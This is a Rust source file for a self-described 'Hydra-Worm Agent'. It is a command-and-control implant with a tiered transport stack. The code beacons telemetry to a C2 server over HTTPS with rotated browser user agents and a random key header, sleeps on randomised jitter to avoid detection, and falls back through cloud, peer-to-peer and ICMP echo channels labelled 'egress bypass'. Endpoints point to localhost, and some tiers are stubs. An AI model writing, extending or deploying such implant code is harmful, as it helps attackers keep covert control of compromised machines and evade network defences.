// Project: Hydra-Worm Agent
// Phase: 1.5 - Failsafe Stack (ICMP Integration)
// Logic: Low-level raw socket signaling for egress bypass

use std::{thread, time::Duration};
use rand::Rng;
use rand::seq::SliceRandom;
use rand_distr::{Distribution, Exp};
use serde::{Serialize, Deserialize};
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, ACCEPT, ACCEPT_LANGUAGE};

// Raw Networking for ICMP
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::icmp::IcmpTypes;
use pnet::packet::MutablePacket;
use pnet::packet::Packet;
use pnet::util;

// --- TELEMETRY STRUCTURES (Synced with Go Orchestrator) ---

#[derive(Serialize, Clone)]
struct Telemetry {
    agent_id: String, // Matches Go json:"agent_id"
    transport: String,
    status: String,
    lambda: f64,
}

#[derive(Deserialize)]
struct C2Response {
    status: String,
    task: String,
    epoch: i64,
}

// --- TRANSPORT TRAIT ---

trait Transport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String>;
    fn get_name(&self) -> String;
}

// --- TRANSPORT TIER 4: ICMP FAILSAFE (NEW) ---

struct IcmpTransport { 
    target_ip: std::net::Ipv4Addr 
}

impl Transport for IcmpTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        println!("[!] C2-ICMP: Encapsulating telemetry for {}...", self.target_ip);
        
        let payload = serde_json::to_vec(stats).map_err(|e| e.to_string())?;
        let mut buffer = vec![0u8; 8 + payload.len()]; 
        
        let mut packet = MutableEchoRequestPacket::new(&mut buffer).unwrap();
        packet.set_icmp_type(IcmpTypes::EchoRequest);
        packet.set_identifier(0x1337);
        packet.set_sequence_number(1);
        packet.set_payload(&payload);
        
        // The .packet() method is now available because of the 'use pnet::packet::Packet'
        let checksum = util::checksum(packet.packet(), 1);
        packet.set_checksum(checksum);

        println!("[*] ICMP Raw Packet Ready: {} bytes", buffer.len());
        
        Ok(C2Response { 
            status: "icmp_dispatched".into(), 
            task: "FAILSAFE_MODE".into(), 
            epoch: 0 
        })
    }
    fn get_name(&self) -> String { "ICMP-Failsafe".into() }
}

// --- TRANSPORT TIER 2: MALLEABLE HTTPS ---

struct MalleableHttps { 
    c2_url: String 
}

impl Transport for MalleableHttps {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let profile = MalleableProfile::new();
        
        let client = reqwest::blocking::Client::builder()
            .use_rustls_tls()
            .timeout(Duration::from_secs(5))
            .build()
            .map_err(|e: reqwest::Error| e.to_string())?;

        let response = client.post(&self.c2_url)
            .headers(profile.headers.clone())
            .header(USER_AGENT, &profile.user_agent)
            .header("X-Hydra-Key", &profile.hydra_key)
            .json(stats)
            .send()
            .map_err(|e: reqwest::Error| format!("Network Error: {}", e))?;

        if response.status().is_success() {
            let body: C2Response = response.json()
                .map_err(|e: reqwest::Error| e.to_string())?;
            
            println!("[+] Malleable Success | Profile: [UA: {}] [Key: {}]", profile.user_agent, profile.hydra_key);
            Ok(body)
        } else {
            Err(format!("HTTP Error: {}", response.status()))
        }
    }
    fn get_name(&self) -> String { "Malleable-HTTPS".into() }
}

// --- MALLEABLE PROFILE ENGINE ---

struct MalleableProfile {
    user_agent: String,
    hydra_key: String,
    headers: HeaderMap,
}

impl MalleableProfile {
    fn new() -> Self {
        let mut rng = rand::thread_rng();
        
        let uas = vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ];

        let mut headers = HeaderMap::new();
        headers.insert(ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));
        
        let key: String = (0..8).map(|_| rng.gen_range(b'A'..=b'Z') as char).collect();

        Self {
            user_agent: uas.choose(&mut rng).unwrap().to_string(),
            hydra_key: key,
            headers,
        }
    }
}

// --- OTHER TRANSPORTS (Placeholders) ---

struct CloudTransport { endpoint: String }
impl Transport for CloudTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
        println!("[!] C2-CLOUD: Mocking connection to {}...", self.endpoint);
        Err("Switching to Tier 2...".into())
    }
    fn get_name(&self) -> String { "Cloud-API".into() }
}

struct P2PTransport;
impl Transport for P2PTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
        println!("[!] C2-P2P: Broadcasting to local mesh...");
        Err("Tier 3 - Mesh discovery active".into())
    }
    fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
}

// --- CORE AGENT ENGINE ---

struct Agent {
    id: String,
    transport: Box<dyn Transport>,
    failures: u32,
    state: u8,
    lambda: f64,
}

impl Agent {
    fn new(id: &str) -> Self {
        Self {
            id: id.to_string(),
            transport: Box::new(MalleableHttps { c2_url: "http://localhost:8080/api/v1/heartbeat".into() }),
            failures: 0,
            state: 1, 
            lambda: 0.2, 
        }
    }

    fn run(&mut self) {
        loop {
            let stats = Telemetry {
                agent_id: self.id.clone(),
                transport: self.transport.get_name(),
                status: "OK".into(),
                lambda: self.lambda,
            };

            match self.transport.send_heartbeat(&stats) {
                Ok(res) => {
                    println!("[+] C2 Task: {} | Epoch: {}", res.task, res.epoch);
                    self.failures = 0;
                },
                Err(e) => {
                    println!("[-] Failure: {}", e);
                    self.failures += 1;
                }
            }

            if self.failures >= 3 { self.mutate(); }

            // NHPP Jitter Engine
            let exp = Exp::new(self.lambda).unwrap();
            let sleep_time = exp.sample(&mut rand::thread_rng()).min(60.0).max(1.0);
            thread::sleep(Duration::from_secs_f64(sleep_time));
        }
    }

    fn mutate(&mut self) {
        self.state = (self.state + 1) % 4; // Expanded for Tier 4 (ICMP)
        self.failures = 0;
        println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);

        self.transport = match self.state {
            0 => Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
            1 => Box::new(MalleableHttps { c2_url: "http://localhost:8080/api/v1/heartbeat".into() }),
            2 => Box::new(P2PTransport),
            _ => Box::new(IcmpTransport { target_ip: "127.0.0.1".parse().unwrap() }), // Tier 4 Failsafe
        };
    }
}

fn display_splash() {
    println!(r#"
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ `/   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    "#);
    println!("      [ Phase 1.5 - Failsafe Stack Active ]\n");
}

fn main() {
    display_splash();
    let mut agent = Agent::new("HYDRA-AGENT-01");
    agent.run();
}